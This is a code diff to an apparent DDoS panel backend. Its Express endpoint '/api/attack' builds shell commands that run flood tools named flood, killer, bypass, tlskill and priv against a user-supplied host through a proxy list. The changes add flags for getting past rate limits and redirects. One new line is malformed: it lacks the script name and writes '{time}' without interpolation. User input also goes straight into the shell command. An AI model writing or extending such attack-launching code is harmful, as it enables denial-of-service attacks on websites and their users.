@@ -58,16 +58,16 @@ app.get("/api/attack", (req, res) => {
       command = `node flood ${host} ${time} 10 10 live.txt flood`;
       break;
     case "killer":
-      command = `node killer ${host} ${time} 10 10 live.txt killer`;
+      command = `node killer GET ${host} ${time} 10 10 live.txt`;
       break;
     case "bypass":
-      command = `node bypass ${host} ${time} 10 10 live.txt bypass`;
+      command = `node bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`;
       break;
     case "tlskill":
       command = `node tlskill ${host} ${time} 10 10 live.txt tlskill`;
       break;
     case "priv":
-      command = `node priv ${host} ${time} 10 10 live.txt priv`;
+      command = `node -m GET -u ${host} -s {time} -p live.txt --ratelimit true --full true`;
       break;
   }
 
